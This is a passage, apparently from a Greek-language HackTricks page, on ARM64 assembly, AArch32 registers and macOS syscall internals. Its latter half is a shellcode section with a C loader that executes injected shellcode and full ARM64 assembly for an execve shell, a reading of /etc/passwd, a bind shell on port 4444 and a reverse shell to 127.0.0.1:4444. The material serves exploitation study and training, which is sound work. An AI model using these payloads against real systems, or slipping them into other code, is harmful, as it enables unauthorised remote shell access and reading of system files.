- **`svc`** : Κάνει ένα **system call**. Σημαίνει "Supervisor Call". Όταν ο επεξεργαστής εκτελεί αυτή την εντολή, **εναλλάσσεται από λειτουργία χρήστη σε λειτουργία kernel** και πηγαίνει σε μια συγκεκριμένη θέση στη μνήμη όπου βρίσκεται ο κώδικας διαχείρισης system call του **kernel**.

- Παράδειγμα:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **Αποθήκευση του link register και του frame pointer στη στοίβα**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Ρύθμιση του νέου δείκτη πλαισίου**: `mov x29, sp` (ρυθμίζει τον νέο δείκτη πλαισίου για την τρέχουσα συνάρτηση)
3. **Δέσμευση χώρου στη στοίβα για τοπικές μεταβλητές** (εάν χρειάζεται): `sub sp, sp, <size>` (όπου `<size>` είναι ο αριθμός των bytes που χρειάζονται)

### **Επίλογος Συνάρτησης**

1. **Αποδέσμευση τοπικών μεταβλητών (εάν είχαν δεσμευτεί)**: `add sp, sp, <size>`
2. **Επαναφορά του καταχωρητή σύνδεσης και του δείκτη πλαισίου**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Επιστροφή**: `ret` (επιστρέφει τον έλεγχο στον καλούντα χρησιμοποιώντας τη διεύθυνση στο link register)

## Κατάσταση Εκτέλεσης AARCH32

Armv8-A υποστηρίζει την εκτέλεση προγραμμάτων 32-bit. **AArch32** μπορεί να τρέξει σε ένα από **δύο σύνολα εντολών**: **`A32`** και **`T32`** και μπορεί να αλλάζει μεταξύ τους μέσω **`interworking`**.\
**Προνομιούχα** 64-bit προγράμματα μπορούν να προγραμματίσουν την **εκτέλεση προγραμμάτων 32-bit** εκτελώντας μια μεταφορά επιπέδου εξαίρεσης στο λιγότερο προνομιούχο 32-bit.\
Σημειώστε ότι η μετάβαση από 64-bit σε 32-bit συμβαίνει σε χαμηλότερο επίπεδο εξαίρεσης (π.χ. ένα 64-bit πρόγραμμα σε EL1 που ενεργοποιεί πρόγραμμα σε EL0). Αυτό γίνεται με το να οριστεί το **bit 4 του** ειδικού καταχωρητή **`SPSR_ELx`** **σε 1** όταν το `AArch32` process thread είναι έτοιμο για εκτέλεση και τα υπόλοιπα του `SPSR_ELx` αποθηκεύουν την CPSR των προγραμμάτων **`AArch32`**. Στη συνέχεια, η προνομιούχα διεργασία καλεί την εντολή **`ERET`** ώστε ο επεξεργαστής να μεταβεί σε **`AArch32`**, εισερχόμενος σε A32 ή T32 ανάλογα με την CPSR**.**

Η **`interworking`** γίνεται χρησιμοποιώντας τα bit J και T της CPSR. `J=0` και `T=0` σημαίνει **`A32`** και `J=0` και `T=1` σημαίνει **T32**. Αυτό πρακτικά σημαίνει τη ρύθμιση του **κατώτερου bit σε 1** για να υποδείξει ότι το σύνολο εντολών είναι T32.\
Αυτό ορίζεται κατά τη διάρκεια των **interworking branch instructions,** αλλά μπορεί επίσης να οριστεί απευθείας με άλλες εντολές όταν το PC οριστεί ως ο καταχωρητής προορισμού. Παράδειγμα:

Ένα άλλο παράδειγμα:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Καταχωρητές

Υπάρχουν 16 καταχωρητές 32-bit (r0-r15). **Από r0 έως r14** μπορούν να χρησιμοποιηθούν για **οποιαδήποτε ενέργεια**, ωστόσο κάποιοι συνήθως προορίζονται:

- **`r15`**: μετρητής προγράμματος (πάντα). Περιέχει τη διεύθυνση της επόμενης εντολής. Στο A32 current + 8, στο T32 current + 4.
- **`r11`**: Δείκτης πλαισίου (Frame Pointer)
- **`r12`**: Καταχωρητής κλήσης ενδο-διαδικασίας (Intra-procedural call register)
- **`r13`**: Δείκτης στοίβας (Stack Pointer) (Σημείωση: η στοίβα είναι πάντα ευθυγραμμισμένη κατά 16 bytes)
- **`r14`**: Link Register

Επιπλέον, οι καταχωρητές αντιγράφονται σε **`banked registries`**. Πρόκειται για θέσεις που αποθηκεύουν τις τιμές των καταχωρητών επιτρέποντας την **γρήγορη εναλλαγή context** κατά την αντιμετώπιση εξαιρέσεων και σε προνομιακές λειτουργίες, ώστε να αποφεύγεται η ανάγκη χειροκίνητης αποθήκευσης και επαναφοράς των καταχωρητών κάθε φορά.\
Αυτό γίνεται με **αποθήκευση της κατάστασης του επεξεργαστή από το `CPSR` στο `SPSR`** της λειτουργίας επεξεργασίας στην οποία έχει προκύψει η εξαίρεση. Κατά την επιστροφή από την εξαίρεση, το **`CPSR`** επαναφέρεται από το **`SPSR`**.

### CPSR - Καταχωρητής Κατάστασης Τρέχοντος Προγράμματος

Στο AArch32 το CPSR λειτουργεί παρόμοια με το **`PSTATE`** στο AArch64 και αποθηκεύεται επίσης στο **`SPSR_ELx`** όταν λαμβάνεται μια εξαίρεση για να επαναφερθεί αργότερα η εκτέλεση:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Τα πεδία χωρίζονται σε μερικές ομάδες:

- Application Program Status Register (APSR): Σημαίες αριθμητικών αποτελεσμάτων και προσβάσιμο από EL0
- Execution State Registers: Συμπεριφορά της διεργασίας (διαχειρίζεται από το OS).

#### Application Program Status Register (APSR)

- Οι σημαίες **`N`**, **`Z`**, **`C`**, **`V`** (όπως στο AArch64)
- Η σημαία **`Q`**: Ορίζεται σε 1 όποτε συμβαίνει **κορεσμός ακεραίων** κατά την εκτέλεση μιας ειδικής εντολής κορεσμένης αριθμητικής. Μόλις οριστεί σε **`1`**, διατηρεί την τιμή μέχρι να οριστεί χειροκίνητα σε 0. Επιπλέον, δεν υπάρχει καμία εντολή που να ελέγχει την τιμή της έμμεσα — πρέπει να διαβαστεί χειροκίνητα.
- Σημαίες **`GE`** (Greater than or equal): Χρησιμοποιούνται σε SIMD (Single Instruction, Multiple Data) λειτουργίες, όπως "parallel add" και "parallel subtract". Αυτές οι λειτουργίες επιτρέπουν την επεξεργασία πολλαπλών δεδομένων σε μία εντολή.

Για παράδειγμα, η εντολή **`UADD8`** **προσθέτει τέσσερα ζεύγη byte** (από δύο 32-bit τελεστές) παράλληλα και αποθηκεύει τα αποτελέσματα σε έναν 32-bit καταχωρητή. Στη συνέχεια **ορίζει τις σημαίες `GE` στο `APSR`** βάσει αυτών των αποτελεσμάτων. Καθεμία από τις σημαίες GE αντιστοιχεί σε μία από τις προσθέσεις byte, υποδεικνύοντας εάν η πρόσθεση για το αντίστοιχο ζεύγος byte **υπερχείλισε**.

Η εντολή **`SEL`** χρησιμοποιεί αυτές τις σημαίες GE για να εκτελεί υπό όρους ενέργειες.

#### Execution State Registers

- Τα bit **`J`** και **`T`**: Το **`J`** πρέπει να είναι 0 και αν το **`T`** είναι 0 χρησιμοποιείται το σετ εντολών A32, ενώ αν είναι 1 χρησιμοποιείται το T32.
- IT Block State Register (`ITSTATE`): Πρόκειται για τα bit 10-15 και 25-26. Αποθηκεύουν τις συνθήκες για εντολές μέσα σε μια ομάδα με πρόθεμα **`IT`**.
- Το bit **`E`**: Υποδεικνύει την **endianness**.
- Mode and Exception Mask Bits (0-4): Καθορίζουν την τρέχουσα κατάσταση εκτέλεσης. Το 5ο bit δείχνει αν το πρόγραμμα τρέχει ως 32bit (1) ή 64bit (0). Τα άλλα 4 αντιπροσωπεύουν τη λειτουργία εξαίρεσης που χρησιμοποιείται αυτήν τη στιγμή (όταν συμβαίνει μια εξαίρεση και αυτή διαχειρίζεται). Ο αριθμός που είναι ρυθμισμένος υποδεικνύει την τρέχουσα προτεραιότητα σε περίπτωση που ενεργοποιηθεί άλλη εξαίρεση ενώ αυτή εκτελείται.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Ορισμένες εξαιρέσεις μπορούν να απενεργοποιηθούν χρησιμοποιώντας τα bit **`A`**, `I`, `F`. Αν το **`A`** είναι 1 σημαίνει ότι θα ενεργοποιηθούν asynchronous aborts. Το **`I`** ρυθμίζει την ανταπόκριση σε εξωτερικά αιτήματα hardware Interrupts (IRQs), και το `F` σχετίζεται με Fast Interrupt Requests (FIRs).

## macOS

### BSD syscalls

Δείτε το [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) ή εκτελέστε `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls θα έχουν **x16 > 0**.

### Mach Traps

Δείτε στο [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) τον `mach_trap_table` και στο [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) τα prototypes. Ο μέγιστος αριθμός των Mach traps είναι `MACH_TRAP_TABLE_COUNT` = 128. Τα Mach traps θα έχουν **x16 < 0**, οπότε πρέπει να καλείτε τους αριθμούς από την προηγούμενη λίστα με ένα **πλην**: **`_kernelrpc_mach_vm_allocate_trap`** είναι **`-10`**.

Μπορείτε επίσης να ελέγξετε το **`libsystem_kernel.dylib`** σε έναν disassembler για να βρείτε πώς να καλείτε αυτές (και τις BSD) syscalls:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Note that **Ida** and **Ghidra** can also decompile **specific dylibs** from the cache just by passing the cache.

> [!TIP]
> Μερικές φορές είναι πιο εύκολο να ελέγξετε τον **decompiled** κώδικα από **`libsystem_kernel.dylib`** **παρά** να ελέγξετε τον **source code** επειδή ο κώδικας πολλών syscalls (BSD και Mach) παράγεται μέσω scripts (δείτε τα σχόλια στον source code), ενώ στο dylib μπορείτε να βρείτε τι καλείται.

### machdep calls

Το XNU υποστηρίζει έναν άλλο τύπο κλήσεων που ονομάζονται machine dependent. Οι αριθμοί αυτών των κλήσεων εξαρτώνται από την αρχιτεκτονική και ούτε οι κλήσεις ούτε οι αριθμοί εγγυώνται ότι θα παραμείνουν σταθεροί.

### comm page

Αυτή είναι μια kernel owner memory page που είναι mapped στο address scape κάθε users process. Σκοπός της είναι να κάνει τη μετάβαση από user mode σε kernel space πιο γρήγονρη από τη χρήση syscalls για kernel services που χρησιμοποιούνται τόσο πολύ ώστε αυτή η μετάβαση να ήταν πολύ αναποτελεσματική.

Για παράδειγμα η κλήση `gettimeofdate` διαβάζει την τιμή του `timeval` απευθείας από την comm page.

### objc_msgSend

Είναι πολύ συνηθισμένο να βρείτε αυτή τη συνάρτηση να χρησιμοποιείται σε προγράμματα Objective-C ή Swift. Αυτή η συνάρτηση επιτρέπει να κληθεί μια μέθοδος ενός Objective-C αντικειμένου.

Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Pointer to the instance
- x1: op -> Selector of the method
- x2... -> Τα υπόλοιπα arguments της invoked μεθόδου

Άρα, αν βάλετε breakpoint πριν το branch προς αυτή τη συνάρτηση, μπορείτε εύκολα να βρείτε τι καλείται στο lldb με (σε αυτό το παράδειγμα το αντικείμενο καλεί ένα αντικείμενο από `NSConcreteTask` που θα τρέξει μια εντολή):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Ορίζοντας τη μεταβλητή περιβάλλοντος **`NSObjCMessageLoggingEnabled=1`** είναι δυνατόν να καταγράψετε πότε αυτή η συνάρτηση καλείται σε ένα αρχείο όπως `/tmp/msgSends-pid`.
>
> Επιπλέον, ορίζοντας **`OBJC_HELP=1`** και εκτελώντας οποιοδήποτε binary μπορείτε να δείτε άλλες μεταβλητές περιβάλλοντος που μπορείτε να χρησιμοποιήσετε για να **log** πότε συμβαίνουν ορισμένες Objc-C ενέργειες.

Όταν καλείται αυτή η συνάρτηση, χρειάζεται να εντοπιστεί η μέθοδος που καλείται στην υποδεικνυόμενη instance — για αυτό εκτελούνται διάφορες αναζητήσεις:

- Perform optimistic cache lookup:
- Αν επιτύχει, ολοκληρώνεται
- Απόκτηση runtimeLock (read)
- If (realize && !cls->realized) realize class
- If (initialize && !cls->initialized) initialize class
- Try class own cache:
- Αν επιτύχει, ολοκληρώνεται
- Try class method list:
- Αν βρεθεί, ενημέρωσε την cache και ολοκληρώνεται
- Try superclass cache:
- Αν επιτύχει, ολοκληρώνται
- Try superclass method list:
- Αν βρεθεί, ενημέρωσε την cache και ολοκληρώνεται
- If (resolver) try method resolver, and repeat from class lookup
- If still here (= all else has failed) try forwarder

### Shellcodes

Για να μεταγλωττίσετε:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Για να εξάγετε τα bytes:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Για νεότερα macOS:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>C code για να δοκιμάσετε το shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Λήφθηκε από [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) και εξηγείται.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Ανάγνωση με cat

Ο στόχος είναι να εκτελεστεί `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, οπότε το δεύτερο όρισμα (x1) είναι ένας πίνακας παραμέτρων (που στη μνήμη σημαίνει μια stack με τις διευθύνσεις).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Εκτέλεση εντολής με sh από fork ώστε η κύρια διεργασία να μην τερματιστεί
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell από [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s] σε **port 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Από [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell προς **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
